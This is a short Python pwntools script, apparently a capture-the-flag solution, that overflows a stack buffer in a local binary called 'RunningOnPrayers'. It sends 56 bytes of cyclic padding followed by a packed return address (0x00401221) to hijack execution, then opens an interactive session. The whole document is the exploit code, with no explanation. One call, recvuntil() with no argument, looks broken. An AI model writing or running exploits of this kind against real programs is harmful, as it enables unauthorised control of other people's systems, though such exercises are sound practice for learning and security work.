from pwn import *

a=b'Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7A'
b=p32(0x00401221)

# open ./RunningOnPrayers using pwn tools
p = process('./RunningOnPrayers')
p.send(a+b)
p.recvuntil()

p.interactive()
# p.close()
